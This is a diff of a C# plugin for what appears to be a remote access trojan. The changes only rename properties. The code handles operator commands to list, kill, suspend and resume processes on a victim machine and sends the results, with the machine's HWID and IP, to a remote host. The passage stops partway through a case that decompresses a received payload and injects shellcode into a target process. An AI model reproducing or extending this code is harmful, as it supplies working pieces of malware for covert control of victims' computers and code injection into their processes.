@@ -14,34 +14,34 @@ namespace Plugin
     {
         public static void Main(LoadingAPI loadingAPI)
         {
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
 
                 case PacketType.PM_GET_PROCESSES:
-                    ProcessManagerPacket processManagerPacket = new ProcessManagerPacket(GetProcesses.GetAllProcesses(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, processManagerPacket);
+                    ProcessManagerPacket processManagerPacket = new ProcessManagerPacket(GetProcesses.GetAllProcesses(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, processManagerPacket);
                     break;
 
                 case PacketType.PM_KILL_PROCESS:
-                    ProcessKillerPacket processToKill = (ProcessKillerPacket)loadingAPI.currentPacket;
-                    ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(KillProcess.IsKilled(processToKill.processId), processToKill.processId, processToKill.processName, processToKill.rowIndex, loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, processKillerPacket);
+                    ProcessKillerPacket processToKill = (ProcessKillerPacket)loadingAPI.CurrentPacket;
+                    ProcessKillerPacket processKillerPacket = new ProcessKillerPacket(KillProcess.IsKilled(processToKill.processId), processToKill.processId, processToKill.processName, processToKill.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, processKillerPacket);
                     break;
 
                 case PacketType.PM_SUSPEND_PROCESS:
-                    SuspendProcessPacket processToSuspend = (SuspendProcessPacket)loadingAPI.currentPacket;
-                    SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(SuspendProcess.IsSuspended(processToSuspend.processId), processToSuspend.processId, processToSuspend.processName, processToSuspend.rowIndex, loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, suspendProcessPacket);
+                    SuspendProcessPacket processToSuspend = (SuspendProcessPacket)loadingAPI.CurrentPacket;
+                    SuspendProcessPacket suspendProcessPacket = new SuspendProcessPacket(SuspendProcess.IsSuspended(processToSuspend.processId), processToSuspend.processId, processToSuspend.processName, processToSuspend.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, suspendProcessPacket);
                     break;
 
                 case PacketType.PM_RESUME_PROCESS:
-                    ResumeProcessPacket processToResume = (ResumeProcessPacket)loadingAPI.currentPacket;
-                    ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(ResumeProcess.IsResumed(processToResume.processId), processToResume.processId, processToResume.processName, processToResume.rowIndex, loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, resumeProcessPacket);
+                    ResumeProcessPacket processToResume = (ResumeProcessPacket)loadingAPI.CurrentPacket;
+                    ResumeProcessPacket resumeProcessPacket = new ResumeProcessPacket(ResumeProcess.IsResumed(processToResume.processId), processToResume.processId, processToResume.processName, processToResume.rowIndex, loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, resumeProcessPacket);
                     break;
 
                 case PacketType.PM_INJECT_PROCESS:
-                    ProcessInjectionPacket processInjectionPacket = (ProcessInjectionPacket)loadingAPI.currentPacket;
+                    ProcessInjectionPacket processInjectionPacket = (ProcessInjectionPacket)loadingAPI.CurrentPacket;
                     if (processInjectionPacket.injectionMethod == ProcessInjectionPacket.INJECTION_METHODS.CLASSIC)
                     {
                         ProcessInjection.InjectShellCodeClassicMethod(processInjectionPacket.processId, Compressor.QuickLZ.Decompress(processInjectionPacket.payload));
